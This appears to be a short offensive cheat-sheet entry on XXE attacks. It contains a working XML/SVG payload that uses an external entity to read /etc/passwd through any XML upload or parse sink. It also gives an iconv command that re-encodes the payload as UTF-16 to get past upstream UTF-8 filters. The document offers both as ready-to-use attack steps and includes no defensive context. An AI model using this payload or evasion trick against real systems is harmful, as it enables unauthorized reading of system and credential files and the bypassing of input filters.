# XXE

Classic external entity file read, via any XML upload/parse sink (SVG is a common one — it's just XML):
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

If a UTF-8 payload gets rejected/stripped by an encoding check, re-encode the whole file as UTF-16 — some XML parsers happily auto-detect and parse UTF-16 while an upstream filter was only inspecting it as UTF-8 bytes:
```bash
iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml
```
